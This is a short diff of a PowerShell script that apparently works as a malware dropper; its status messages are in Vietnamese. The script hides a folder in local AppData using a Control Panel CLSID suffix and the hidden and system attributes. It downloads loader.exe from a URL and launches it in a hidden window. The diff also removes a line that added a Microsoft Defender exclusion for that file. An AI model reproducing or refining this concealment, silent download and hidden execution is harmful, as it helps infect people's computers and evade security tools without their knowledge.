@@ -38,7 +38,7 @@ finally {
     Write-Host "Đã tắt Critical Process"
 }
 
-$rdir = "C:\Users\Loader"
+$rdir = "$env:localappdata\Loader"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
@@ -49,7 +49,6 @@ $output = "$dir\loader.exe"
 if (Test-Path -Path $output) {
     Write-Host "hello"
 } else {
-    Add-MpPreference -ExclusionPath $output 
     Invoke-WebRequest -Uri $url -OutFile $output
     Start-Process -WindowStyle Hidden -FilePath $output
 }
